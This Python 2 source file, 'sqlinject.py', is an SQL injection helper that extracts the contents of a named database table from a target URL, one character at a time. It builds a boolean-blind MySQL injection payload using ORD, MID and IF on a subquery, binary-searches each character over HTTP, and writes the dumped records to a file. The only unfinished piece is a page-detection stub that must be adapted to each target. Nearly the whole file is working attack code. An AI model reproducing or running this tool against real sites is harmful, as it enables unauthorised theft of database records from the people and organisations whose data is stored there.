#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------
#   File Name: sqlinject.py
#      Author: Zhao Yanbai
#              2016-07-28 10:06:10 星期四 CST
# Description: SQL注入辅助猜解工具,必需要指定数据库名，表名，字段名
# ------------------------------------------------------------------------

import sys
import random
import urllib
import urllib2
import argparse
import string

gArgs = None


def IsErrPage(html) :
    print("Need to Rewrite The IsErrPage Function")
    sys.exit()
    lines = html.splitlines()
    if len(lines) > 0 :
        #print lines[1]
        if lines[1] == '<html>' :
            return False
        else :
            return True
    else :
        print("[!] Exception. Invalid Http Response")
        fd = open("InvalidHttpResponse.txt", "a+")
        fd.write(html)
        fd.close()

    return True


def getRandStr(length) :
    rs = ''
    cs = string.ascii_letters
    for i in range(0, length) :
        inx = random.randint(0, len(cs)-1)
        rs += cs[inx]

    return rs


def httpRead(url) :
    rsp = ''
    retry = 0
    while True :
        try :
            print url
            hc = urllib2.urlopen(url)
            rsp = hc.read()
        except Exception, e:
            retry += 1
            print("[!] Exception {0} Retry {1}".format(str(e), retry))
            continue
        break
    return rsp

def DoGuess(URL) :
    minVal = 0
    maxVal = 128

    while minVal < maxVal :
        midVal = (minVal + maxVal) // 2
        #print "min:{0} mid:{1}, max{2}".format(minVal, midVal, maxVal)

        url = URL.format(Op='>', GuessValue=midVal)
        rsp = httpRead(url)
        if IsErrPage(rsp) :
            maxVal = midVal
        else :
            minVal = midVal + 1

    #print ">min:{0} mid:{1}, max{2}".format(minVal, midVal, maxVal)
    url = URL.format(Op='!=', GuessValue=minVal)
    rsp = httpRead(url)

    if IsErrPage(rsp) :
        print "Guessed:", chr(minVal)
    else :
        print "FUcked"
        sys.exit(0)


    return chr(minVal)




def main() :
    global gArgs
    fieldNames = gArgs.field
    recordId = -1 
    allRecordDumped = False
    while not allRecordDumped :
        try :
            fd = open(gArgs.outfile, 'a+')
        except Exception, e :
            print("Failed to open outfile:", gArgs.outfile, "Error:", e)
            sys.exit()

        randInt = random.randint(1000, 9999)
        randStr = getRandStr(4)
        recordId += 1
        URL = gArgs.url + "' AND {RandInt}=IF((ORD(MID((SELECT IFNULL(CAST({FieldName} AS CHAR),CHAR(32)) FROM " + gArgs.db + "." + gArgs.table + " LIMIT {RecordId},1),{LetterInx},1)){Op}{GuessValue}),{RandInt},0) AND '{RandStr}'='{RandStr}"

        for i in range(0, len(fieldNames)) :
            fieldName = fieldNames[i]
            letterInx = 0
            letters = ''
            while True :
                letterInx += 1
                url = URL.format(RandInt=randInt, RandStr=randStr, RecordId=recordId, LetterInx=letterInx, FieldName=fieldName, Op='{Op}', GuessValue='{GuessValue}')
                l = DoGuess(URL=url)

                if l == '\0' :
                    break
                else :
                    letters += l
                    fd.write(l)
                    fd.flush()

            if letters == '' and i == 0 :
                allRecordDumped = True
                break

            fd.write(',')
            fd.flush()

            print "retrieved:", letters

        fd.write('\n')

def parseArguments() :
    global gArgs
    parser = argparse.ArgumentParser(prog='sqlinject', description=u'SQLInjection Assist Tool', epilog='')
    parser.add_argument('-u',   '--url',        action='store', help='injection url')
    parser.add_argument('-o',   '--outfile',    action='store', help='result output file', default='./result.txt')
    parser.add_argument('-D',   '--db',         action='store', help='database name')
    parser.add_argument('-T',   '--table',      action='store', help='table name')
    parser.add_argument('-F',   '--field',      action='store', help='FIELD is field name', nargs='+')
    gArgs = parser.parse_args()

    if gArgs.url == '' or gArgs.db == '' or gArgs.table == '' or gArgs.field == None :
        parser.print_help()
        sys.exit()

if __name__ == "__main__" :
    parseArguments()
    main()
